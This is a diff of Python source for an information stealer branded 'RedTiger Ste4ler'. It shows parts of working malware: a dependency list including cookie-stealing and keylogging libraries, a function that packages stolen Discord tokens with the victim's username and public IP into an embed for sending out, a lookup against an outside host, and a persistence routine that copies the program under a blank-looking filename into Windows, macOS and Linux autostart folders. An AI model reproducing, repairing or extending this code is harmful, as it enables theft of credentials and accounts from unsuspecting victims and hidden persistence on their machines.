@@ -54,41 +54,12 @@ while True:
         break
     except:
         modules = [
-            "setuptools",
-            "--upgrade pip setuptools wheel",
-            "pyinstaller",
-            "pyinstaller --upgrade",
-            "platform",
-            "ctypes",
-            "screeninfo",
-            "psutil",
-            "GPUtil",
-            "sqlite3",
-            "urllib3",
-            "json",
-            "socket",
-            "requests",
-            "pycryptodome",
-            "subprocess",
-            "datetime",
-            "base64",
-            "re",
-            "string",
-            "pypiwin32",
-            "discord",
-            "discord.py",
-            "--upgrade discord.py",
-            "shutil",
-            "pathlib",
-            "pillow",
-            "pycryptodome",
-            "uuid",
-            "Pillow",
-            "browser-cookie3",
-            "opencv-python",
-            "pyautogui",
-            "keyboard",
-            "tkinter"
+            "--upgrade pip",
+            "platform", "ctypes", "screeninfo", "psutil", "GPUtil", "sqlite3",
+            "urllib3", "json", "socket", "requests", "pycryptodome", "subprocess",
+            "datetime", "base64", "re", "string", "pypiwin32", "discord.py",
+            "sys", "shutil", "pathlib", "uuid", "Pillow", "browser-cookie3",
+            "opencv-python", "pyautogui", "keyboard", "tkinter"
         ]
 
         for module in modules:
@@ -120,15 +91,15 @@ def Clear():
     except:
         pass
 
-
-color_embed = 0xB20000
+website = "redtiger.shop"
+color_embed = 0xa80505
 username_embed = 'RedTiger Ste4ler'
 avatar_embed = 'https://media.discordapp.net/attachments/1185940734256357427/1252261629546987550/logo_redtiger.png?ex=66719306&is=66704186&hm=c0cdee4699eb76dd404125866c4130d77ed177426daf71d8c976e5bbcb44c6bd&=&format=webp&quality=lossless&width=810&height=810'
+footer_text = f"RedTiger Ste4ler"
 footer_embed = {
-        "text": f"RedTiger Ste4ler",
+        "text": footer_text,
         "icon_url": avatar_embed,
         }
-footer_text = f"RedTiger Ste4ler"
                  
 
 try: hostname_pc = socket.gethostname()
@@ -161,7 +132,7 @@ except:
 
 try:
     try:
-        response = requests.get(f"https://redtiger.shop/api/ip/ip={ip_address_public}")
+        response = requests.get(f"https://{website}/api/ip/ip={ip_address_public}")
         api = response.json()
 
         country = api['country']
@@ -657,7 +628,7 @@ def Di5c0rd_T0k3n():
                 embed = Embed(title=f'Discord Token `{username_pc} "{ip_address_public}"`:', color=color_embed)
                 embed.set_thumbnail(url=av4t4r_ur1_d15c0rd)
                 embed.add_field(name=":bust_in_silhouette: | Username:",
-                                value=f"```{us3r_1d_d15c0rd}```", inline=True)
+                                value=f"```{u53rn4m3_d15c0rd}```", inline=True)
                 embed.add_field(name=":bust_in_silhouette: | Display Name:",
                                 value=f"```{d15pl4y_n4m3_d15c0rd}```", inline=True)
                 embed.add_field(name=":robot: | Id:",
@@ -1334,35 +1305,25 @@ def B10ck_W3b5it3():
 St4rtup = r'''
 def St4rtup():
     try:
-        try:
-            path_script = os.path.abspath(__file__)
-            new_name = "ㅤ.py"
+        file_path = os.path.abspath(sys.argv[0])
 
-            if sys.platform.startswith('win'):  
-                folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-            elif sys.platform.startswith('darwin'): 
-                folder = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
-            elif sys.platform.startswith('linux'):
-                folder = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
-            else:
-                pass
-            path_new_file = os.path.join(folder, new_name)
+        if file_path.endswith(".exe"):
+            ext = "exe"
+        elif file_path.endswith(".py"):
+            ext = "py"
 
-            shutil.copy(path_script, path_new_file)
-            os.chmod(path_new_file, 0o777) 
-        except:
-            path_script = sys.executable
-            new_name = "ㅤ.exe"
-            if sys.platform.startswith('win'):  
-                folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-            elif sys.platform.startswith('darwin'): 
-                folder = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
-            elif sys.platform.startswith('linux'):
-                folder = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
-            
-            path_new_file = os.path.join(folder, new_name)
-            shutil.copy(path_script, path_new_file)
-            os.chmod(path_new_file, 0o777)
+        new_name = f"ㅤ.{ext}"
+
+        if sys.platform.startswith('win'):  
+            folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+        elif sys.platform.startswith('darwin'): 
+            folder = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
+        elif sys.platform.startswith('linux'):
+            folder = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
+        path_new_file = os.path.join(folder, new_name)
+
+        shutil.copy(file_path, path_new_file)
+        os.chmod(path_new_file, 0o777) 
     except:
         pass
 '''
